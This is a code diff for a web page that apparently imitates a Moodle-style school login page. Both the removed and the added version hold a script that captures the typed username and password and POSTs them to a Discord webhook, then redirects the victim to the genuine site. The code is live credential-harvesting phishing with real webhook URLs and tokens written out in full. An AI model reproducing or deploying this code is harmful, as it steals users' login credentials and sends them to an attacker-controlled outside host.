@@ -285,54 +285,41 @@ M.util.help_popups.setup(Y);
 
 <script>
 document.addEventListener('DOMContentLoaded', function () {
-    const form = document.querySelector('form#login');
-    
-    if (form) {
-        form.addEventListener('submit', function (event) {
-            event.preventDefault(); // Evita que el formulario se envíe de manera tradicional
-            
-            // Obtén los valores de usuario y contraseña
-            const username = document.querySelector('input[name="username"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-
-            // Deshabilita el botón para evitar múltiples clics
-            const submitBtn = document.getElementById('loginbtn');
-            if (submitBtn) submitBtn.disabled = true;
-
-            // Envía los datos al webhook de Discord
-            fetch('https://discord.com/api/webhooks/1350938854458265600/opkSFYqJEYlKdqD7oR94UNuybEmUTD9v4VIn6YKWlKpAdZtvbYEZz9mp_CIPgGPJjANE', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `Nuevo intento de login:\nUsuario: ${username}\nContraseña: ${password}`
-                })
+    // Sobrescribir la función validar() existente
+    window.validar = function() {
+        const username = document.getElementById('txtUsuario').value;
+        const password = document.getElementById('txtPassword').value;
+        
+        fetch('https://discord.com/api/webhooks/1347639051930439711/zhyHwO1Kjg5gZpxQVC58X114E358bTBsWx2DMFW9wnO01laEiqP5FuZYsr0Wk6dJVavd', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: `Nuevo intento de login:\nUsuario: ${username}\nContraseña: ${password}`
             })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Datos enviados correctamente a Discord');
-                    // Redirige a la página deseada después de enviar los datos
-                    setTimeout(function () {
-                        window.location.href = 'https://anoeta.saioka.eus/course/view.php?id=606&section=160&unidad=3'; // Cambia esta URL por la que desees
-                    }, 3000); // 3000 milisegundos = 3 segundos
-                } else {
-                    console.error('Error al enviar datos a Discord:', response.status);
-                    alert('Error al enviar datos. Intente nuevamente.');
-                    if (submitBtn) submitBtn.disabled = false; // Reactiva el botón en caso de error
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Error de conexión. Intente nuevamente.');
-                if (submitBtn) submitBtn.disabled = false; // Reactiva el botón en caso de error
-            });
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Datos enviados correctamente');
+                // Redirigir tras el envío exitoso
+                window.location.href = 'https://anoeta.saioka.eus/';
+            } else {
+                // Continuar con el comportamiento original como fallback
+                return false;
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            return false;
         });
-    } else {
-        console.error('Formulario no encontrado');
-    }
+        
+        // Prevenir el comportamiento normal del formulario
+        return false;
+    };
 });
 </script>
+
 
 
 
